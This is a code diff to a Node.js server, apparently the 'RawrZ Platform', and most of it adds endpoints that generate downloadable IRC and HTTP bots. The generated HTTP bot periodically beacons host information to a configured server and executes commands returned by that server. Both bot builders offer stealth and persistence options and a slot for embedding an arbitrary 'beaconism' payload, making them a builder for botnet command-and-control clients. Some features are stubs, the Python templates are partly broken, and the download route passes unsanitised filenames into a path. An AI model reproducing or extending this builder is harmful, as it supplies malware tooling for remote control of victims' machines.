@@ -385,19 +385,21 @@ const realModules = {
         getStatus: async () => await opensslManagement.getStatus(),
         getConfigSummary: async () => await opensslManagement.getConfigSummary(),
         getOpenSSLAlgorithms: async () => await opensslManagement.getOpenSSLAlgorithms(),
-        getAllAlgorithms: async () => await opensslManagement.getAllAlgorithms(),
+        getAllAlgorithms: async () => await opensslManagement.getAvailableAlgorithms(),
         getCustomAlgorithms: async () => await opensslManagement.getCustomAlgorithms(),
         toggleOpenSSLMode: async (enabled) => await opensslManagement.toggleOpenSSLMode(enabled),
         toggleCustomAlgorithms: async (enabled) => await opensslManagement.toggleCustomAlgorithms(enabled),
         applyPreset: async (presetName) => await opensslManagement.applyPreset(presetName),
         testAlgorithm: async (algorithm, data) => await opensslManagement.testAlgorithm(algorithm, data),
-        getPerformance: async () => await opensslManagement.getPerformance(),
-        resetPerformance: async () => await opensslManagement.resetPerformance(),
+        getPerformance: async () => await opensslManagement.getPerformanceStats(),
+        resetPerformance: async () => await opensslManagement.resetPerformanceData(),
         generateReport: async () => await opensslManagement.generateReport(),
         getSettings: async () => await opensslManagement.getSettings(),
         getPanelConfig: async () => await opensslManagement.getPanelConfig(),
         getAvailableEndpoints: async () => await opensslManagement.getAvailableEndpoints(),
-        getCLICommands: async () => await opensslManagement.getCLICommands()
+        getCLICommands: async () => await opensslManagement.getCLICommands(),
+        encrypt: async (data, options) => await opensslManagement.encrypt(data, options),
+        decrypt: async (encryptedData, options) => await opensslManagement.decrypt(encryptedData, options)
     },
 
     implementationChecker: {
@@ -825,6 +827,115 @@ app.post('/cli', requireAuth, async (req, res) => {
         });
     } catch (error) {
         console.error('CLI execution error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// IRC Bot Builder endpoint
+app.post('/irc-bot/build', requireAuth, async (req, res) => {
+    try {
+        const { config, features, extension, advancedOptions, payload } = req.body;
+        
+        if (!config || !config.server) {
+            return res.status(400).json({
+                success: false,
+                error: 'IRC server configuration is required'
+            });
+        }
+        
+        // Generate IRC bot with beaconism integration
+        const botCode = generateIRCBotCode(config, features, advancedOptions, payload);
+        const filename = `irc_bot_${Date.now()}${extension}`;
+        const filepath = path.join(__dirname, 'generated', filename);
+        
+        // Ensure generated directory exists
+        if (!fs.existsSync(path.join(__dirname, 'generated'))) {
+            fs.mkdirSync(path.join(__dirname, 'generated'));
+        }
+        
+        // Write bot file
+        fs.writeFileSync(filepath, botCode);
+        
+        res.json({
+            success: true,
+            result: {
+                filename,
+                filepath,
+                downloadUrl: `/download/${filename}`,
+                size: fs.statSync(filepath).size
+            }
+        });
+    } catch (error) {
+        console.error('IRC bot build error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// HTTP Bot Builder endpoint
+app.post('/http-bot/build', requireAuth, async (req, res) => {
+    try {
+        const { config, features, extension, advancedOptions, payload } = req.body;
+        
+        if (!config || !config.server) {
+            return res.status(400).json({
+                success: false,
+                error: 'HTTP server configuration is required'
+            });
+        }
+        
+        // Generate HTTP bot with beaconism integration
+        const botCode = generateHTTPBotCode(config, features, advancedOptions, payload);
+        const filename = `http_bot_${Date.now()}${extension}`;
+        const filepath = path.join(__dirname, 'generated', filename);
+        
+        // Ensure generated directory exists
+        if (!fs.existsSync(path.join(__dirname, 'generated'))) {
+            fs.mkdirSync(path.join(__dirname, 'generated'));
+        }
+        
+        // Write bot file
+        fs.writeFileSync(filepath, botCode);
+        
+        res.json({
+            success: true,
+            result: {
+                filename,
+                filepath,
+                downloadUrl: `/download/${filename}`,
+                size: fs.statSync(filepath).size
+            }
+        });
+    } catch (error) {
+        console.error('HTTP bot build error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// Download endpoint for generated files
+app.get('/download/:filename', (req, res) => {
+    try {
+        const filename = req.params.filename;
+        const filepath = path.join(__dirname, 'generated', filename);
+        
+        if (!fs.existsSync(filepath)) {
+            return res.status(404).json({
+                success: false,
+                error: 'File not found'
+            });
+        }
+        
+        res.download(filepath, filename);
+    } catch (error) {
+        console.error('Download error:', error);
         res.status(500).json({
             success: false,
             error: error.message
@@ -4197,18 +4308,6 @@ app.post('/api/mutex-engine/create', requireAuth, async (req, res) => {
 });
 
 // OpenSSL Management specific endpoints
-app.post('/api/openssl-management/generate-key', requireAuth, async (req, res) => {
-    try {
-        const { type, options = {} } = req.body || {};
-        if (!type) {
-            return res.status(400).json({ error: 'type is required' });
-        }
-        const result = await realModules.opensslManagement.generateKey(type, options);
-        res.json({ success: true, result });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
-});
 
 // Implementation Checker specific endpoints
 app.post('/api/implementation-checker/check', requireAuth, async (req, res) => {
@@ -4892,7 +4991,7 @@ app.post('/openssl/toggle-custom', requireAuth, async (req, res) => {
 
 app.get('/openssl/algorithms', requireAuth, async (req, res) => {
     try {
-        const result = await realModules.opensslManagement.getAllAlgorithms();
+        const result = await realModules.opensslManagement.getAvailableAlgorithms();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -4971,7 +5070,7 @@ app.post('/openssl-management/test', requireAuth, async (req, res) => {
 
 app.get('/openssl-management/performance', requireAuth, async (req, res) => {
     try {
-        const result = await realModules.opensslManagement.getPerformance();
+        const result = await realModules.opensslManagement.getPerformanceStats();
         res.json({ success: true, performance: result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -4980,7 +5079,7 @@ app.get('/openssl-management/performance', requireAuth, async (req, res) => {
 
 app.post('/openssl-management/reset-performance', requireAuth, async (req, res) => {
     try {
-        const result = await realModules.opensslManagement.resetPerformance();
+        const result = await realModules.opensslManagement.resetPerformanceData();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -6427,6 +6526,596 @@ app.get('/api/advanced-stub-generator/info', requireAuth, async (req, res) => {
         res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
     }
 });
+// Bot Code Generation Functions
+function generateIRCBotCode(config, features, advancedOptions, payload) {
+    const { server, port, nickname, username, channel } = config;
+    
+    let botCode = '';
+    
+    // Determine file type based on extension
+    const extension = config.extension || '.js';
+    
+    if (extension === '.js') {
+        botCode = `// IRC Bot - Generated by RawrZApp
+const net = require('net');
+const crypto = require('crypto');
+
+class IRCBot {
+    constructor() {
+        this.server = '${server}';
+        this.port = ${port || 6667};
+        this.nickname = '${nickname || 'RawrZBot'}';
+        this.username = '${username || 'rawrzuser'}';
+        this.channel = '${channel || '#rawrz'}';
+        this.socket = null;
+        this.connected = false;
+        ${features.stealth ? 'this.stealthMode = true;' : ''}
+        ${features.persistence ? 'this.persistent = true;' : ''}
+    }
+    
+    connect() {
+        this.socket = new net.Socket();
+        
+        this.socket.connect(this.port, this.server, () => {
+            console.log('Connected to IRC server');
+            this.sendCommand('NICK', this.nickname);
+            this.sendCommand('USER', this.username, '0', '*', ':RawrZApp IRC Bot');
+        });
+        
+        this.socket.on('data', (data) => {
+            this.handleData(data.toString());
+        });
+        
+        this.socket.on('close', () => {
+            console.log('Connection closed');
+            this.connected = false;
+            ${features.persistence ? 'setTimeout(() => this.connect(), 5000);' : ''}
+        });
+        
+        this.socket.on('error', (err) => {
+            console.error('Connection error:', err);
+        });
+    }
+    
+    sendCommand(command, ...params) {
+        if (this.socket && this.connected) {
+            const message = command + ' ' + params.join(' ') + '\\r\\n';
+            this.socket.write(message);
+        }
+    }
+    
+    handleData(data) {
+        const lines = data.split('\\r\\n');
+        
+        for (const line of lines) {
+            if (line.trim()) {
+                this.handleLine(line);
+            }
+        }
+    }
+    
+    handleLine(line) {
+        console.log('Received:', line);
+        
+        if (line.includes('PING')) {
+            const pong = line.replace('PING', 'PONG');
+            this.socket.write(pong + '\\r\\n');
+        }
+        
+        if (line.includes('001')) {
+            this.connected = true;
+            ${features.autoJoin ? `this.sendCommand('JOIN', this.channel);` : ''}
+        }
+        
+        ${features.commandHandler ? `
+        if (line.includes('PRIVMSG')) {
+            const match = line.match(/:([^!]+)![^@]+@[^\\s]+\\s+PRIVMSG\\s+([^\\s]+)\\s+:(.+)/);
+            if (match) {
+                const [, user, target, message] = match;
+                this.handleCommand(user, target, message);
+            }
+        }` : ''}
+    }
+    
+    ${features.commandHandler ? `
+    handleCommand(user, target, message) {
+        const command = message.split(' ')[0].toLowerCase();
+        
+        switch (command) {
+            case '!ping':
+                this.sendCommand('PRIVMSG', target, ':Pong!');
+                break;
+            case '!info':
+                this.sendCommand('PRIVMSG', target, ':RawrZApp IRC Bot v1.0');
+                break;
+            ${features.fileTransfer ? `
+            case '!download':
+                // File transfer functionality
+                this.sendCommand('PRIVMSG', target, ':File transfer not implemented');
+                break;` : ''}
+            default:
+                break;
+        }
+    }` : ''}
+    
+    ${advancedOptions.addBeaconism ? `
+    // Beaconism integration
+    beaconism() {
+        // Add beaconism payload here
+        ${payload ? `const payload = '${payload}';` : ''}
+        // Execute beaconism functionality
+        console.log('Beaconism activated');
+    }` : ''}
+    
+    ${advancedOptions.addEncryption ? `
+    // Encryption functionality
+    encrypt(data) {
+        const algorithm = 'aes-256-cbc';
+        const key = crypto.randomBytes(32);
+        const iv = crypto.randomBytes(16);
+        const cipher = crypto.createCipher(algorithm, key);
+        let encrypted = cipher.update(data, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return { encrypted, key: key.toString('hex'), iv: iv.toString('hex') };
+    }` : ''}
+}
+
+// Start bot
+const bot = new IRCBot();
+bot.connect();
+
+${advancedOptions.addBeaconism ? 'bot.beaconism();' : ''}
+`;
+    } else if (extension === '.py') {
+        botCode = `#!/usr/bin/env python3
+# IRC Bot - Generated by RawrZApp
+import socket
+import threading
+import time
+import re
+${advancedOptions.addEncryption ? 'import hashlib' : ''}
+
+class IRCBot:
+    def __init__(self):
+        self.server = '${server}'
+        self.port = ${port || 6667}
+        self.nickname = '${nickname || 'RawrZBot'}'
+        self.username = '${username || 'rawrzuser'}'
+        self.channel = '${channel || '#rawrz'}'
+        self.socket = None
+        self.connected = False
+        ${features.stealth ? 'self.stealth_mode = True' : ''}
+        ${features.persistence ? 'self.persistent = True' : ''}
+    
+    def connect(self):
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.connect((self.server, self.port))
+            self.send_command(f'NICK {self.nickname}')
+            self.send_command(f'USER {self.username} 0 * :RawrZApp IRC Bot')
+            self.listen()
+        except Exception as e:
+            print(f'Connection error: {e}')
+            ${features.persistence ? 'time.sleep(5); self.connect()' : ''}
+    
+    def send_command(self, command):
+        if self.socket:
+            self.socket.send(f'{command}\\r\\n'.encode())
+    
+    def listen(self):
+        while True:
+            try:
+                data = self.socket.recv(1024).decode()
+                if not data:
+                    break
+                self.handle_data(data)
+            except Exception as e:
+                print(f'Error: {e}')
+                break
+    
+    def handle_data(self, data):
+        lines = data.split('\\r\\n')
+        for line in lines:
+            if line.strip():
+                self.handle_line(line)
+    
+    def handle_line(self, line):
+        print(f'Received: {line}')
+        
+        if 'PING' in line:
+            pong = line.replace('PING', 'PONG')
+            self.send_command(pong)
+        
+        if '001' in line:
+            self.connected = True
+            ${features.autoJoin ? f'self.send_command(f"JOIN {self.channel}")' : ''}
+        
+        ${features.commandHandler ? '''
+        if 'PRIVMSG' in line:
+            match = re.match(r':([^!]+)![^@]+@[^\\s]+\\s+PRIVMSG\\s+([^\\s]+)\\s+:(.+)', line)
+            if match:
+                user, target, message = match.groups()
+                self.handle_command(user, target, message)''' : ''}
+    
+    ${features.commandHandler ? '''
+    def handle_command(self, user, target, message):
+        command = message.split()[0].lower()
+        
+        if command == '!ping':
+            self.send_command(f'PRIVMSG {target} :Pong!')
+        elif command == '!info':
+            self.send_command(f'PRIVMSG {target} :RawrZApp IRC Bot v1.0')
+        ''' + (features.fileTransfer ? '''
+        elif command == '!download':
+            self.send_command(f'PRIVMSG {target} :File transfer not implemented')
+        ''' : '') + '''
+        else:
+            pass''' : ''}
+    
+    ${advancedOptions.addBeaconism ? f'''
+    def beaconism(self):
+        # Add beaconism payload here
+        {'payload = "' + payload + '"' if payload else '# No payload provided'}
+        # Execute beaconism functionality
+        print('Beaconism activated')''' : ''}
+    
+    ${advancedOptions.addEncryption ? '''
+    def encrypt(self, data):
+        # Simple encryption implementation
+        return hashlib.sha256(data.encode()).hexdigest()''' : ''}
+
+if __name__ == '__main__':
+    bot = IRCBot()
+    bot.connect()
+    ${advancedOptions.addBeaconism ? 'bot.beaconism()' : ''}
+`;
+    } else {
+        // For other extensions, create a simple batch/shell script
+        botCode = `@echo off
+REM IRC Bot - Generated by RawrZApp
+echo Starting IRC Bot...
+echo Server: ${server}
+echo Port: ${port || 6667}
+echo Nickname: ${nickname || 'RawrZBot'}
+echo Channel: ${channel || '#rawrz'}
+echo.
+echo Bot configuration loaded.
+echo Use a proper IRC client to connect to ${server}:${port || 6667}
+pause
+`;
+    }
+    
+    return botCode;
+}
+
+function generateHTTPBotCode(config, features, advancedOptions, payload) {
+    const { server, endpoint, botId, interval } = config;
+    
+    let botCode = '';
+    
+    // Determine file type based on extension
+    const extension = config.extension || '.js';
+    
+    if (extension === '.js') {
+        botCode = `// HTTP Bot - Generated by RawrZApp
+const https = require('https');
+const http = require('http');
+const crypto = require('crypto');
+const os = require('os');
+
+class HTTPBot {
+    constructor() {
+        this.server = '${server}';
+        this.endpoint = '${endpoint || '/bot'}';
+        this.botId = '${botId || 'RawrZBot'}';
+        this.interval = ${interval || 30} * 1000; // Convert to milliseconds
+        this.running = false;
+        ${features.stealth ? 'this.stealthMode = true;' : ''}
+        ${features.persistence ? 'this.persistent = true;' : ''}
+    }
+    
+    start() {
+        console.log('Starting HTTP Bot...');
+        this.running = true;
+        this.reportToServer();
+        
+        if (this.interval > 0) {
+            setInterval(() => {
+                if (this.running) {
+                    this.reportToServer();
+                }
+            }, this.interval);
+        }
+    }
+    
+    stop() {
+        console.log('Stopping HTTP Bot...');
+        this.running = false;
+    }
+    
+    async reportToServer() {
+        try {
+            const data = {
+                botId: this.botId,
+                timestamp: new Date().toISOString(),
+                systemInfo: this.getSystemInfo(),
+                status: 'active'
+            };
+            
+            ${features.screenshot ? 'data.screenshot = await this.takeScreenshot();' : ''}
+            
+            await this.sendToServer(data);
+        } catch (error) {
+            console.error('Report error:', error);
+        }
+    }
+    
+    getSystemInfo() {
+        return {
+            platform: os.platform(),
+            arch: os.arch(),
+            hostname: os.hostname(),
+            uptime: os.uptime(),
+            memory: os.totalmem(),
+            cpus: os.cpus().length
+        };
+    }
+    
+    ${features.screenshot ? `
+    async takeScreenshot() {
+        // Screenshot functionality would be implemented here
+        return 'screenshot_data_base64';
+    }` : ''}
+    
+    async sendToServer(data) {
+        return new Promise((resolve, reject) => {
+            const url = new URL(this.endpoint, this.server);
+            const postData = JSON.stringify(data);
+            
+            const options = {
+                hostname: url.hostname,
+                port: url.port || (url.protocol === 'https:' ? 443 : 80),
+                path: url.pathname,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(postData),
+                    'User-Agent': 'RawrZApp-HTTPBot/1.0'
+                }
+            };
+            
+            const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
+                let responseData = '';
+                
+                res.on('data', (chunk) => {
+                    responseData += chunk;
+                });
+                
+                res.on('end', () => {
+                    try {
+                        const response = JSON.parse(responseData);
+                        this.handleServerResponse(response);
+                        resolve(response);
+                    } catch (error) {
+                        reject(error);
+                    }
+                });
+            });
+            
+            req.on('error', (error) => {
+                reject(error);
+            });
+            
+            req.write(postData);
+            req.end();
+        });
+    }
+    
+    handleServerResponse(response) {
+        if (response.commands) {
+            for (const command of response.commands) {
+                this.executeCommand(command);
+            }
+        }
+    }
+    
+    ${features.commandHandler ? `
+    executeCommand(command) {
+        switch (command.type) {
+            case 'info':
+                this.reportToServer();
+                break;
+            case 'screenshot':
+                ${features.screenshot ? 'this.takeScreenshot().then(data => this.sendToServer({screenshot: data}));' : ''}
+                break;
+            ${features.fileTransfer ? `
+            case 'download':
+                // File download functionality
+                break;
+            case 'upload':
+                // File upload functionality
+                break;` : ''}
+            default:
+                console.log('Unknown command:', command.type);
+        }
+    }` : ''}
+    
+    ${advancedOptions.addBeaconism ? `
+    // Beaconism integration
+    beaconism() {
+        // Add beaconism payload here
+        ${payload ? `const payload = '${payload}';` : ''}
+        // Execute beaconism functionality
+        console.log('Beaconism activated');
+    }` : ''}
+    
+    ${advancedOptions.addEncryption ? `
+    // Encryption functionality
+    encrypt(data) {
+        const algorithm = 'aes-256-cbc';
+        const key = crypto.randomBytes(32);
+        const iv = crypto.randomBytes(16);
+        const cipher = crypto.createCipher(algorithm, key);
+        let encrypted = cipher.update(data, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return { encrypted, key: key.toString('hex'), iv: iv.toString('hex') };
+    }` : ''}
+}
+
+// Start bot
+const bot = new HTTPBot();
+bot.start();
+
+${advancedOptions.addBeaconism ? 'bot.beaconism();' : ''}
+
+// Keep process alive
+process.on('SIGINT', () => {
+    bot.stop();
+    process.exit(0);
+});
+`;
+    } else if (extension === '.py') {
+        botCode = `#!/usr/bin/env python3
+# HTTP Bot - Generated by RawrZApp
+import requests
+import json
+import time
+import platform
+import os
+${advancedOptions.addEncryption ? 'import hashlib' : ''}
+
+class HTTPBot:
+    def __init__(self):
+        self.server = '${server}'
+        self.endpoint = '${endpoint || '/bot'}'
+        self.bot_id = '${botId || 'RawrZBot'}'
+        self.interval = ${interval || 30}
+        self.running = False
+        ${features.stealth ? 'self.stealth_mode = True' : ''}
+        ${features.persistence ? 'self.persistent = True' : ''}
+    
+    def start(self):
+        print('Starting HTTP Bot...')
+        self.running = True
+        self.report_to_server()
+        
+        if self.interval > 0:
+            while self.running:
+                time.sleep(self.interval)
+                if self.running:
+                    self.report_to_server()
+    
+    def stop(self):
+        print('Stopping HTTP Bot...')
+        self.running = False
+    
+    def get_system_info(self):
+        return {
+            'platform': platform.platform(),
+            'system': platform.system(),
+            'machine': platform.machine(),
+            'hostname': platform.node(),
+            'python_version': platform.python_version()
+        }
+    
+    def report_to_server(self):
+        try:
+            data = {
+                'botId': self.bot_id,
+                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                'systemInfo': self.get_system_info(),
+                'status': 'active'
+            }
+            
+            ${features.screenshot ? 'data["screenshot"] = self.take_screenshot()' : ''}
+            
+            response = self.send_to_server(data)
+            if response:
+                self.handle_server_response(response)
+        except Exception as e:
+            print(f'Report error: {e}')
+    
+    def send_to_server(self, data):
+        try:
+            url = f'{self.server}{self.endpoint}'
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'RawrZApp-HTTPBot/1.0'
+            }
+            
+            response = requests.post(url, json=data, headers=headers, timeout=10)
+            return response.json() if response.status_code == 200 else None
+        except Exception as e:
+            print(f'Server communication error: {e}')
+            return None
+    
+    def handle_server_response(self, response):
+        if 'commands' in response:
+            for command in response['commands']:
+                self.execute_command(command)
+    
+    ${features.commandHandler ? '''
+    def execute_command(self, command):
+        cmd_type = command.get('type', '')
+        
+        if cmd_type == 'info':
+            self.report_to_server()
+        elif cmd_type == 'screenshot':
+            ''' + (features.screenshot ? 'self.take_screenshot()' : 'pass') + '''
+        ''' + (features.fileTransfer ? '''
+        elif cmd_type == 'download':
+            # File download functionality
+            pass
+        elif cmd_type == 'upload':
+            # File upload functionality
+            pass''' : '') + '''
+        else:
+            print(f'Unknown command: {cmd_type}')''' : ''}
+    
+    ${features.screenshot ? '''
+    def take_screenshot(self):
+        # Screenshot functionality would be implemented here
+        return 'screenshot_data_base64'''' : ''}
+    
+    ${advancedOptions.addBeaconism ? f'''
+    def beaconism(self):
+        # Add beaconism payload here
+        {'payload = "' + payload + '"' if payload else '# No payload provided'}
+        # Execute beaconism functionality
+        print('Beaconism activated')''' : ''}
+    
+    ${advancedOptions.addEncryption ? '''
+    def encrypt(self, data):
+        # Simple encryption implementation
+        return hashlib.sha256(data.encode()).hexdigest()''' : ''}
+
+if __name__ == '__main__':
+    bot = HTTPBot()
+    try:
+        bot.start()
+    except KeyboardInterrupt:
+        bot.stop()
+    ${advancedOptions.addBeaconism ? 'bot.beaconism()' : ''}
+`;
+    } else {
+        // For other extensions, create a simple batch/shell script
+        botCode = `@echo off
+REM HTTP Bot - Generated by RawrZApp
+echo Starting HTTP Bot...
+echo Server: ${server}
+echo Endpoint: ${endpoint || '/bot'}
+echo Bot ID: ${botId || 'RawrZBot'}
+echo Report Interval: ${interval || 30} seconds
+echo.
+echo Bot configuration loaded.
+echo Use curl or similar tool to report to ${server}${endpoint || '/bot'}
+pause
+`;
+    }
+    
+    return botCode;
+}
+
 app.listen(port, () => {
     console.log(`[OK] RawrZ Platform server running on port ${port}`);
     console.log(`[INFO] Available engines: ${Object.keys(realModules).length}`);
